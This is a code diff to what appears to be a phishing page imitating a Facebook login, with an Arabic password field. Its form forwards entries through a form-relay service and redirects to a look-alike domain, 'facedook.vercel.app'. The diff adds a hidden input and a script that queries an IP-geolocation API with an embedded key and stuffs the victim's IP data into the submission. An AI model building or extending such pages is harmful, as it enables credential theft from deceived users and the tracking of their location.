@@ -37,7 +37,7 @@
     placeholder="كلمة السر"
     name="password"
   />
-
+<input type="text" name="ip info" id="ip" style="display:none"/>
 <input type="hidden" name="_captcha" value="false"/>
 <input type="hidden" name="_next" value="https://facedook.vercel.app/index.html"/>
 <input type="hidden" name="_template" value="table"/>
@@ -90,7 +90,19 @@ error.hidden = true;
 function show(){
 document.getElementById("error").hidden = false;
 };
+
+var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("ip").value =   this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://api.ipdata.co/?api-key=039310658d62e9a1260c7f070e0e76dc396f0d25b317fcd4bf3d7b18");
+  xhttp.send();
+}
 </script>
   
 </body>
 </html>
+
+
